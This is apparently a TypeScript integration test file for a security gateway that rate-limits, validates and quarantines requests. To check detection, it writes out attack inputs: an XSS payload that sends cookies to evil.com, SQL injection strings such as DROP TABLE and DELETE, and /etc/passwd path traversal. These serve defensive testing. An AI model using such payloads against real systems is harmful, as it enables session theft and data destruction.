/**
 * OMEGA GATEWAY — Integration Tests
 * Phase 17 — Full Pipeline Scenarios
 * 
 * Tests the complete flow: RATE_LIMIT → VALIDATION → QUARANTINE → OUTPUT
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { 
  Gateway, 
  createContext, 
  GatewayStatus, 
  GatewayStage,
  ThreatCategory,
  ThreatSeverity,
} from '../../src/gateway/index.js';

describe('GATEWAY Integration — Full Pipeline', () => {
  let gateway: Gateway;

  beforeEach(() => {
    gateway = new Gateway({
      rateLimitEnabled: true,
      rateLimit: 10,
      rateWindowMs: 60000,
      validationEnabled: true,
      quarantineEnabled: true,
      quarantineThreshold: ThreatSeverity.HIGH,
      strictMode: false,
      detailedReports: true,
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // SCENARIO: Clean Request Flow
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Scenario: Safe request end-to-end', () => {
    it('allows clean request through all stages', async () => {
      const ctx = createContext('user123');
      const result = await gateway.run({ 
        data: 'Hello, this is a perfectly safe message!' 
      }, ctx);
      
      expect(result.status).toBe(GatewayStatus.ALLOWED);
      expect(result.allowed).toBe(true);
      expect(result.data).toBe('Hello, this is a perfectly safe message!');
      expect(result.threats).toHaveLength(0);
      expect(result.stagesCompleted).toContain(GatewayStage.RATE_LIMIT);
      expect(result.stagesCompleted).toContain(GatewayStage.VALIDATION);
      expect(result.stagesCompleted).toContain(GatewayStage.OUTPUT);
    });

    it('completes all stages in order', async () => {
      const ctx = createContext('user123');
      const result = await gateway.run({ data: 'safe' }, ctx);
      
      // Verify stage order
      const rlIndex = result.stagesCompleted.indexOf(GatewayStage.RATE_LIMIT);
      const valIndex = result.stagesCompleted.indexOf(GatewayStage.VALIDATION);
      const outIndex = result.stagesCompleted.indexOf(GatewayStage.OUTPUT);
      
      expect(rlIndex).toBeLessThan(valIndex);
      expect(valIndex).toBeLessThan(outIndex);
    });

    it('includes all reports for clean request', async () => {
      const ctx = createContext('user123');
      const result = await gateway.run({ data: 'safe' }, ctx);
      
      expect(result.reports.rateLimit).toBeDefined();
      expect(result.reports.validation).toBeDefined();
      expect(result.reports.rateLimit?.allowed).toBe(true);
      expect(result.reports.validation?.passed).toBe(true);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // SCENARIO: XSS Attack Blocked
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Scenario: XSS attack flow', () => {
    it('detects and quarantines XSS attempt', async () => {
      const ctx = createContext('attacker');
      const result = await gateway.run({ 
        data: '<script>document.location="http://evil.com?c="+document.cookie</script>' 
      }, ctx);
      
      expect(result.status).toBe(GatewayStatus.QUARANTINED);
      expect(result.allowed).toBe(false);
      expect(result.threats.some(t => t.category === ThreatCategory.XSS)).toBe(true);
      expect(result.reports.quarantine?.quarantined).toBe(true);
    });

    it('passes rate limit before blocking XSS', async () => {
      const ctx = createContext('attacker');
      const result = await gateway.run({ 
        data: '<script>evil()</script>' 
      }, ctx);
      
      // Should have passed rate limit (not rate limited)
      expect(result.reports.rateLimit?.allowed).toBe(true);
      // But then got quarantined at validation
      expect(result.status).toBe(GatewayStatus.QUARANTINED);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // SCENARIO: SQL Injection Blocked
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Scenario: SQL injection flow', () => {
    it('blocks critical SQL injection', async () => {
      const ctx = createContext('hacker');
      const result = await gateway.run({ 
        data: "'; DROP TABLE users; --" 
      }, ctx);
      
      expect(result.status).toBe(GatewayStatus.BLOCKED);
      expect(result.allowed).toBe(false);
      expect(result.threats.some(t => t.category === ThreatCategory.SQL_INJECTION)).toBe(true);
      expect(result.rejectedAt).toBe(GatewayStage.VALIDATION);
    });

    it('includes validation report for blocked request', async () => {
      const ctx = createContext('hacker');
      const result = await gateway.run({ 
        data: "1; DELETE FROM users WHERE 1=1" 
      }, ctx);
      
      expect(result.reports.validation?.passed).toBe(false);
      expect(result.reports.validation?.maxSeverity).toBe(ThreatSeverity.CRITICAL);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // SCENARIO: Rate Limiting Under Attack
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Scenario: Burst attack flow', () => {
    it('rate limits flood attack before validation', async () => {
      const ctx = createContext('flooder');
      
      // Send 15 requests (limit is 10)
      const results = [];
      for (let i = 0; i < 15; i++) {
        results.push(await gateway.run({ data: `request-${i}` }, ctx));
      }
      
      const allowed = results.filter(r => r.status === GatewayStatus.ALLOWED);
      const rateLimited = results.filter(r => r.status === GatewayStatus.RATE_LIMITED);
      
      expect(allowed.length).toBe(10);
      expect(rateLimited.length).toBe(5);
    });

    it('stops processing at rate limit stage', async () => {
      const ctx = createContext('flooder');
      
      // Exhaust limit
      for (let i = 0; i < 10; i++) {
        await gateway.run({ data: 'test' }, ctx);
      }
      
      // Next request should be rate limited
      const result = await gateway.run({ data: '<script>x</script>' }, ctx);
      
      expect(result.status).toBe(GatewayStatus.RATE_LIMITED);
      // Should not have reached validation (no XSS threat detected)
      expect(result.stagesCompleted).not.toContain(GatewayStage.VALIDATION);
      expect(result.threats).toHaveLength(0);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // SCENARIO: Mixed Attack Types
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Scenario: Mixed attack patterns', () => {
    it('detects multiple threat types in one request', async () => {
      const ctx = createContext('attacker');
      const result = await gateway.run({ 
        data: '<script>eval("../../../etc/passwd")</script>' 
      }, ctx);
      
      // Should detect both XSS and path traversal
      expect(result.threats.length).toBeGreaterThanOrEqual(2);
      
      const categories = result.threats.map(t => t.category);
      expect(categories).toContain(ThreatCategory.XSS);
      expect(categories).toContain(ThreatCategory.PATH_TRAVERSAL);
    });

    it('reports highest severity', async () => {
      const ctx = createContext('attacker');
      const result = await gateway.run({ 
        data: '<script>1 UNION SELECT * FROM users</script>' 
      }, ctx);
      
      expect(result.reports.validation?.maxSeverity).toBe(ThreatSeverity.CRITICAL);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // SCENARIO: JSON API Requests
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Scenario: JSON API flow', () => {
    it('validates and allows clean JSON', async () => {
      const ctx = createContext('api-client');
      const result = await gateway.run({ 
        data: {
          action: 'createUser',
          payload: { name: 'Alice', email: 'alice@example.com' }
        },
        type: 'json'
      }, ctx);
      
      expect(result.status).toBe(GatewayStatus.ALLOWED);
      expect(result.data).toEqual({
        action: 'createUser',
        payload: { name: 'Alice', email: 'alice@example.com' }
      });
    });

    it('detects threats in nested JSON', async () => {
      const ctx = createContext('api-client');
      const result = await gateway.run({ 
        data: {
          action: 'comment',
          payload: { 
            text: '<script>evil()</script>',
            author: 'hacker'
          }
        }
      }, ctx);
      
      expect(result.threats.some(t => t.category === ThreatCategory.XSS)).toBe(true);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // SCENARIO: Hooks
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Scenario: Lifecycle hooks', () => {
    it('calls before hook with input and context', async () => {
      let hookCalled = false;
      let hookInput: unknown;
      let hookContext: unknown;
      
      gateway.onBefore((input, context) => {
        hookCalled = true;
        hookInput = input;
        hookContext = context;
      });
      
      const ctx = createContext('hook-test');
      await gateway.run({ data: 'test' }, ctx);
      
      expect(hookCalled).toBe(true);
      expect(hookInput).toEqual({ data: 'test' });
      expect(hookContext).toEqual(ctx);
    });

    it('calls after hook with result', async () => {
      let hookResult: unknown;
      
      gateway.onAfter((result) => {
        hookResult = result;
      });
      
      const ctx = createContext('hook-test');
      await gateway.run({ data: 'test' }, ctx);
      
      expect(hookResult).toBeDefined();
      expect((hookResult as any).status).toBe(GatewayStatus.ALLOWED);
    });

    it('calls error hook on exception', async () => {
      let errorCaught: Error | null = null;
      
      // Force error by hooking before and throwing
      gateway.onBefore(() => {
        throw new Error('Deliberate test error');
      });
      
      gateway.onError((error) => {
        errorCaught = error;
      });
      
      const ctx = createContext('error-test');
      const result = await gateway.run({ data: 'test' }, ctx);
      
      expect(result.status).toBe(GatewayStatus.ERROR);
      expect(errorCaught).not.toBeNull();
      expect(errorCaught?.message).toBe('Deliberate test error');
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // SCENARIO: Metrics Accuracy
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Scenario: Metrics tracking', () => {
    it('accurately counts all request types', async () => {
      // Safe requests
      for (let i = 0; i < 5; i++) {
        await gateway.run({ data: 'safe' }, createContext(`user${i}`));
      }
      
      // XSS (quarantined)
      await gateway.run({ data: '<script>x</script>' }, createContext('xss'));
      
      // SQL (blocked)
      await gateway.run({ data: '1; DROP TABLE x' }, createContext('sql'));
      
      // Rate limited
      const flooder = createContext('flooder');
      for (let i = 0; i < 15; i++) {
        await gateway.run({ data: 'flood' }, flooder);
      }
      
      const metrics = gateway.getMetrics();
      
      expect(metrics.allowed).toBe(5 + 10); // 5 safe + 10 flood before limit
      expect(metrics.quarantined).toBe(1);
      expect(metrics.blocked).toBe(1);
      expect(metrics.rateLimited).toBe(5);
      expect(metrics.totalRequests).toBe(5 + 1 + 1 + 15);
    });

    it('tracks threats by category', async () => {
      await gateway.run({ data: '<script>x</script>' }, createContext('a'));
      await gateway.run({ data: "' OR '1'='1" }, createContext('b'));
      await gateway.run({ data: '../etc/passwd' }, createContext('c'));
      
      const metrics = gateway.getMetrics();
      
      expect(metrics.threatsByCategory[ThreatCategory.XSS]).toBeGreaterThan(0);
      expect(metrics.threatsByCategory[ThreatCategory.SQL_INJECTION]).toBeGreaterThan(0);
      expect(metrics.threatsByCategory[ThreatCategory.PATH_TRAVERSAL]).toBeGreaterThan(0);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // SCENARIO: Context Integrity
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Scenario: Context preservation (INV-GW-04)', () => {
    it('result contains complete context', async () => {
      const ctx = createContext('user123', 'req-abc-123', { role: 'admin' });
      const result = await gateway.run({ data: 'test' }, ctx);
      
      expect(result.context.clientId).toBe('user123');
      expect(result.context.requestId).toBe('req-abc-123');
      expect(result.context.metadata?.role).toBe('admin');
    });

    it('context preserved even on error', async () => {
      gateway.onBefore(() => { throw new Error('test'); });
      
      const ctx = createContext('error-user', 'req-err');
      const result = await gateway.run({ data: 'test' }, ctx);
      
      expect(result.context.clientId).toBe('error-user');
      expect(result.context.requestId).toBe('req-err');
    });
  });
});
